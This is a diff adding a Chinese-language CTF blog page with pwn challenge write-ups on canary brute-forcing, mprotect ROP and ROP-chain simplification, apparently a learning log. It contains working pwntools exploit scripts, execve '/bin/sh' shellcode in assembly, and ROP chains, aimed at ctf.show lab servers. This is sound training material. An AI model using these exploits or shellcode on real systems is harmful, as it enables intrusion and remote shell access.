res</span><br><span class="line">        ):</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>
+
+<p>exp模板</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./&#x27;)</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;域名&quot;</span>,端口)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xc0&#x27;</span>+shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="手动写shellcode"><a href="#手动写shellcode" class="headerlink" title="手动写shellcode"></a>手动写shellcode</h2><p>先学习一下<a target="_blank" rel="noopener" href="https://blog.csdn.net/j284886202/article/details/133924239">怎么写入shellcode</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Nashi_Ko/article/details/120288385">32和64的系统调用表</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bchrt.com/tools/ascii-converter/">ASCll转16进制</a></p>
+<p><a target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">查看可以被使用汇编指令</a></p>
+<p><a href>在线编写汇编指令</a></p>
+<h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f;</span><br><span class="line">push rax;</span><br><span class="line">mov rdi, rsp;</span><br><span class="line">xor esi, esi;</span><br><span class="line">xor edx, edx;</span><br><span class="line">push 0x3b;</span><br><span class="line">pop rax;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor rax,rax</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">xor rdi,rdi</span><br><span class="line">mov rdi ,0x68732f6e69622f</span><br><span class="line">push rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="x32"><a href="#x32" class="headerlink" title="x32"></a>x32</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">xor ebx,ebx </span><br><span class="line">push ebx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">push 11</span><br><span class="line">pop eax</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="手写open，read，write的shellcode"><a href="#手写open，read，write的shellcode" class="headerlink" title="手写open，read，write的shellcode"></a>手写open，read，write的shellcode</h2><p>这个就是sandbox见我的<a href="http://linkpwn.github.io/2025/03/02/sandbox%E7%BB%95%E8%BF%87/">另一篇文章</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/" class="post-title-link" itemprop="url">pwn54(模拟canary)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-28 09:00:16 / 修改时间：14:41:03" itemprop="dateCreated datePublished" datetime="2025-02-28T09:00:16+08:00">2025-02-28</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ol>
+<li><p>先用IDA打开发现有canary函数</p>
+<p><img src="/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/1.png" alt="1"></p>
+</li>
+<li><p>为什么要比较呢；应为如果我们利用栈溢出改了s1的部分，到了比较的部分就会退出程序。<br><img src="/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/2.png" alt="2"></p>
+</li>
+</ol>
+<p>​       可以看到我们可以利用这个判断爆破出canary,找到canary后利用栈溢出执行flag函数就可以了<br>       <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line">canary=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>):</span><br><span class="line">        r=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28145</span>)</span><br><span class="line">        flag=<span class="number">0x08048696</span></span><br><span class="line">        r.sendlineafter(<span class="string">&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;</span>,<span class="string">&#x27;999&#x27;</span>)</span><br><span class="line">        r.recv()</span><br><span class="line"></span><br><span class="line">        payload1=<span class="string">b&quot;I&quot;</span>*(<span class="number">0x20</span>)+canary+p8(j)<span class="comment">#+b&quot;a&quot;*16+p32(flag)#+p32(0)+p32(876)+p32(877)#+p32(system)</span></span><br><span class="line">        r.send(payload1)</span><br><span class="line"></span><br><span class="line">        a=r.recv()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;Canary Value Incorrect!&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> a: <span class="comment">#不输出这个字符串代表该字符匹配成功</span></span><br><span class="line">            canary+=p8(j) <span class="comment">#将匹配字节加入到后面（canary j  的顺序）</span></span><br><span class="line">            <span class="built_in">print</span>(canary)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;gg&quot;</span>)</span><br><span class="line">        r.close()</span><br><span class="line">r = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28145</span>)</span><br><span class="line">flag=<span class="number">0x08048696</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;How many bytes do you want to write to the buffer?\n&gt;&quot;</span>,<span class="string">&#x27;999&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">payload1=<span class="string">b&quot;I&quot;</span>*(<span class="number">0x20</span>)+canary+<span class="string">b&quot;a&quot;</span>*<span class="number">16</span>+p32(flag)</span><br><span class="line">r.recvuntil(<span class="string">&quot;$&quot;</span>)</span><br><span class="line">r.send(payload1)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2025/02/28/pwn53-%E6%A8%A1%E6%8B%9Fcanary/3.png" alt="3"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/02/27/pwn54-%E7%AE%80%E5%8D%95%E4%BD%86%E6%98%AF%E6%8C%BA%E9%87%8D%E8%A6%81%E7%9A%84/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/27/pwn54-%E7%AE%80%E5%8D%95%E4%BD%86%E6%98%AF%E6%8C%BA%E9%87%8D%E8%A6%81%E7%9A%84/" class="post-title-link" itemprop="url">pwn54(简单但是挺重要的)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-27 21:31:28 / 修改时间：21:42:11" itemprop="dateCreated datePublished" datetime="2025-02-27T21:31:28+08:00">2025-02-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ol>
+<li>用IDA打开<br><img src="/2025/02/27/pwn54-%E7%AE%80%E5%8D%95%E4%BD%86%E6%98%AF%E6%8C%BA%E9%87%8D%E8%A6%81%E7%9A%84/1.png" alt="1"></li>
+</ol>
+<p>​      所以我们只要256全部覆满就可以直接把password直接泄出来。</p>
+<p>​     <img src="/2025/02/27/pwn54-%E7%AE%80%E5%8D%95%E4%BD%86%E6%98%AF%E6%8C%BA%E9%87%8D%E8%A6%81%E7%9A%84/2.png" alt="2"></p>
+<p>   <img src="/2025/02/27/pwn54-%E7%AE%80%E5%8D%95%E4%BD%86%E6%98%AF%E6%8C%BA%E9%87%8D%E8%A6%81%E7%9A%84/3.png" alt="3"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">pwn49(静态编译-mprotect函数)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-27 12:50:51" itemprop="dateCreated datePublished" datetime="2025-02-27T12:50:51+08:00">2025-02-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-02-28 22:41:44" itemprop="dateModified" datetime="2025-02-28T22:41:44+08:00">2025-02-28</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ol>
+<li>首先可以了解mprotect函数，这有<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12163?u_atoken=9922fc0d328fb00582f13feaf446cd57&u_asig=1a0c39d417406383087056184e0042&time__1311=YqRxni0=oDqQqGNKeeTR0D9BDBBAtoqOa4D">佬的文章</a>,可以先看一下</li>
+<li>静态文件基本都有mprotect函数</li>
+<li>我们们的思路基本就是，利用mprotect函数修改某段的权限，然后将shellcode写入这段</li>
+</ol>
+<p>开始写wp</p>
+<ol>
+<li><p>先用IDA打开有mprotect函数</p>
+</li>
+<li><p>用一下命令查看</p>
+</li>
+</ol>
+   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file xxxx #查看是否是静态文件</span><br></pre></td></tr></table></figure>
+
+<p>   <img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/1.png" alt="1"></p>
+<p>​    圈出部分显示是静态文件</p>
+<ol start="3">
+<li><p>我们先用mprotect函数修改一段的权限(就选got表)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/2.png" alt="2"></p>
+</li>
+</ol>
+<p>​     可以看到got的起始地址是0x80da000，先构造mprotect的payload</p>
+<p>​     查看mprotect函数的地址<br>​     <img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/3.png" alt="3"></p>
+<p>用ROPgadget来找pop ret</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only “pop|ret” | grep &quot;pop&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/4.png" alt="4"></p>
+<p>mprotect的第一个参数是需要修改内存的地址，第二个参数是内存空间的大小，第三是需要赋予的权限，再将mprotect的返回地址设置为read的地址，用来读取shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = (0x12 + 0x04) * b&#x27;a&#x27; </span><br><span class="line">payload += p32(0x0806cdd0) # mprotect函数地址</span><br><span class="line">payload += p32(0x08056194) # 3 pop 1 ret地址	</span><br><span class="line">payload += p32(0x080da000) # 需要修改的内存的起始地址</span><br><span class="line">payload += p32(0x1000) # 修改内存空间的大小</span><br><span class="line">payload += p32(0x7) # 需要赋予的权限</span><br><span class="line">payload += p32(0x806bee0) # read函数地址</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再找read的地址,0x806BEE0,read第一个参数是一随便写点就可以，参数二就是我们的shellcode，参数三是读取的大小<br><img src="/2025/02/27/pwn49-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91-mprotect%E5%87%BD%E6%95%B0/5.png" alt="5"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = (0x12 + 0x04) * b&#x27;a&#x27; </span><br><span class="line">payload += p32(0x0806cdd0) # mprotect函数地址</span><br><span class="line">payload += p32(0x08056194) # 3 pop 1 ret地址	</span><br><span class="line">payload += p32(0x080da000) # 需要修改的内存的起始地址</span><br><span class="line">payload += p32(0x1000) # 修改内存空间的大小</span><br><span class="line">payload += p32(0x7) # 需要赋予的权限</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">payload += p32(0x806bee0) # read函数地址</span><br><span class="line">payload += p32(0x080da000) # read函数返回地址(就是我们shellcode所在地址,即我们修改的内存空间的起始地址)</span><br><span class="line">payload += p32(0x0) </span><br><span class="line">payload += p32(0x080da000) # shellcode地址</span><br><span class="line">payload += p32(len(shellcode))</span><br></pre></td></tr></table></figure>
+
+
+
+<p>完整exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28313&quot;)</span><br><span class="line">payload = (0x12 + 0x04) * b&#x27;a&#x27; </span><br><span class="line">payload += p32(0x0806cdd0) # mprotect函数地址</span><br><span class="line">payload += p32(0x08056194) # 3 pop 1 ret地址	</span><br><span class="line">payload += p32(0x080da000) # 需要修改的内存的起始地址</span><br><span class="line">payload += p32(0x1000) # 修改内存空间的大小</span><br><span class="line">payload += p32(0x7) # 需要赋予的权限</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">payload += p32(0x806bee0) # read函数地址</span><br><span class="line">payload += p32(0x080da000) # read函数返回地址(就是我们shellcode所在地址,即我们修改的内存空间的起始地址)</span><br><span class="line">payload += p32(0x0) </span><br><span class="line">payload += p32(0x080da000) # shellcode地址</span><br><span class="line">payload += p32(len(shellcode))</span><br><span class="line">r.recvuntil(&quot;    * *************************************                           &quot;)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/02/26/cmcc-simplerop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/26/cmcc-simplerop/" class="post-title-link" itemprop="url">cmcc_simplerop</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-26 21:08:11 / 修改时间：21:49:32" itemprop="dateCreated datePublished" datetime="2025-02-26T21:08:11+08:00">2025-02-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>写这题的目的</p>
+<ol>
+<li><p>当IDA显示的偏移错误，怎么动态调试</p>
+</li>
+<li><p>用ROP构造的rop链过长，怎么简化</p>
+</li>
+</ol>
+<p>这题主要写这两个问题，其余的与<a href="https://linkpwn.github.io/2025/02/24/BUUCTF-inndy-rop-rop%E9%93%BE/">BUUCTF_inndy_rop(rop链)</a>差不多</p>
+<h3 id="动态调试找到正确的偏移"><a href="#动态调试找到正确的偏移" class="headerlink" title="动态调试找到正确的偏移"></a>动态调试找到正确的偏移</h3><ol>
+<li><p>先用cyclic生成200(数目不固定)字母</p>
+<p><img src="/2025/02/26/cmcc-simplerop/1.png" alt="1"></p>
+</li>
+<li><p>再动态调试</p>
+</li>
+</ol>
+<p>​     <img src="/2025/02/26/cmcc-simplerop/2.png" alt="1"></p>
+<p>​    <img src="/2025/02/26/cmcc-simplerop/3.png" alt="3"></p>
+<p>   <img src="/2025/02/26/cmcc-simplerop/4.png" alt="4"></p>
+<p>  <img src="/2025/02/26/cmcc-simplerop/5.png" alt="5"></p>
+<p>   <img src="/2025/02/26/cmcc-simplerop/6.png" alt="6"></p>
+<p>   可以得到偏移是32</p>
+<ol start="2">
+<li><p>化简ROP链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop --ropchain</span><br></pre></td></tr></table></figure>
+
+<p>还是用这个工具生成ROP链<br>然后参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/W13680336969/article/details/137062020">佬的博客</a>进行修改<br>原本是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += b&#x27;/bin&#x27; </span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += b&#x27;//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08054250) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e851) # pop ecx ; pop ebx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # padding without overwrite ebx</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08054250) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080493e1) # int 0x80</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>我们可以用ROPgadget命令查找可以修改ebx,edx,ecx寄存器的gadget<br><img src="/2025/02/26/cmcc-simplerop/7.png" alt="7"></li>
+</ol>
+</li>
+</ol>
+<p>​          化简1：<br>        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += b&#x27;/bin&#x27; </span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 